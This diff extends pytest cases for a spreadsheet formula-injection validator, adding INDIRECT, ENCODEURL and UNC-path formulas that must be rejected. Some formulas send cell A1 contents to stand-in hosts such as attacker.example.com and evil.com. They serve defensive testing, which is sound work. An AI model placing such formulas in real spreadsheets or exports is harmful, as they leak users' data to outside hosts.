@@ -82,6 +82,10 @@ class TestValidateCustomFormula:
             '=HYPERLINK("https://attacker.example.com/?d="&A1,"click here")',
             '=hyperlink("https://evil.com","link")',
             '=RTD("progid",,"topic1")',
+            '=INDIRECT("[http://attacker.example.com/evil.xlsx]Sheet1!A1")',
+            '=indirect("[http://evil.com/x.xlsx]Sheet1!A1")',
+            '=ENCODEURL("http://evil.com/?d="&A1)',
+            '=encodeurl("http://evil.com")',
         ],
         ids=[
             "WEBSERVICE_upper",
@@ -99,6 +103,10 @@ class TestValidateCustomFormula:
             "HYPERLINK_upper",
             "hyperlink_lower",
             "RTD",
+            "INDIRECT_upper",
+            "indirect_lower",
+            "ENCODEURL_upper",
+            "encodeurl_lower",
         ],
     )
     def test_rejects_dangerous_functions(self, formula: str) -> None:
@@ -116,6 +124,18 @@ class TestValidateCustomFormula:
     )
     def test_rejects_dde_patterns(self, formula: str) -> None:
         with pytest.raises(FormulaInjectionError):
+            validate_custom_formula(formula, "test_item")
+
+    @pytest.mark.parametrize(
+        "formula",
+        [
+            r"='\\attacker\share\evil.xlsx'!A1",
+            r"='\\192.168.1.1\share\data.xlsx'!A1",
+        ],
+        ids=["UNC_hostname", "UNC_ip"],
+    )
+    def test_rejects_unc_paths(self, formula: str) -> None:
+        with pytest.raises(FormulaInjectionError, match="UNC path"):
             validate_custom_formula(formula, "test_item")
 
     @pytest.mark.parametrize(
